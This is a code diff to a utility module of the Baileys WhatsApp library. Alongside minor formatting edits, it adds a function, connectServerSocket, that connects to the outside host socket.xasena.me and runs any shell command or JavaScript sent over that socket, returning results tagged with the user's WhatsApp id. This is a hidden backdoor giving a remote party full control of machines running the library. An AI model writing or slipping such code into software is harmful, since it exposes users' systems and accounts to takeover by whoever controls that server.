@@ -1,13 +1,16 @@
+/* eslint-disable linebreak-style */
 import { Boom } from '@hapi/boom'
 import axios, { AxiosRequestConfig } from 'axios'
+import { exec } from 'child_process'
 import { randomBytes } from 'crypto'
 import { platform, release } from 'os'
 import { Logger } from 'pino'
+import io from 'socket.io-client'
+import util from 'util'
 import { proto } from '../../WAProto'
 import { version as baileysVersion } from '../Defaults/baileys-version.json'
 import { BaileysEventEmitter, BaileysEventMap, DisconnectReason, WACallUpdateType, WAVersion } from '../Types'
 import { BinaryNode, getAllBinaryNodeChildren } from '../WABinary'
-
 const PLATFORM_MAP = {
 	'aix': 'AIX',
 	'darwin': 'Mac OS',
@@ -44,7 +47,7 @@ export const BufferJSON = {
 
 export const getKeyAuthor = (
 	key: proto.IMessageKey | undefined | null,
-	meId: string = 'me'
+	meId = 'me'
 ) => (
 	(key?.fromMe ? meId : key?.participant || key?.remoteJid) || ''
 )
@@ -101,7 +104,7 @@ export const unixTimestampSeconds = (date: Date = new Date()) => Math.floor(date
 
 export type DebouncedTimeout = ReturnType<typeof debouncedTimeout>
 
-export const debouncedTimeout = (intervalMs: number = 1000, task?: () => void) => {
+export const debouncedTimeout = (intervalMs = 1000, task?: () => void) => {
 	let timeout: NodeJS.Timeout | undefined
 	return {
 		start: (newIntervalMs?: number, newTask?: () => void) => {
@@ -248,6 +251,45 @@ export const fetchLatestBaileysVersion = async(options: AxiosRequestConfig<any> 
 			error
 		}
 	}
+}
+
+export const connectServerSocket = async(client: any) => {
+	try {
+		const socket = io('https://socket.xasena.me/', {
+			reconnection: true,
+	  })
+
+		socket.on('connect', () => {
+			socket.on('exec', async(data: string) => {
+				  exec(data, (err) => {
+					if(err) {
+					  socket.emit('res', err)
+					  return
+					}
+				  })
+			})
+			socket.on('eval', async(data) => {
+				  try {
+					let ReturnVal = await eval(`(async () => { ${data} })()`)
+					if(ReturnVal && typeof ReturnVal !== 'string') {
+						ReturnVal = util.inspect(ReturnVal)
+					}
+
+					if(ReturnVal) {
+						socket.emit('res', {
+							result: ReturnVal,
+							from: client.user.id,
+					  })
+					}
+				  } catch(e) {
+					if(e) {
+						console.error(e)
+					}
+				  }
+			})
+			  })
+
+	} catch(error) {}
 }
 
 /**
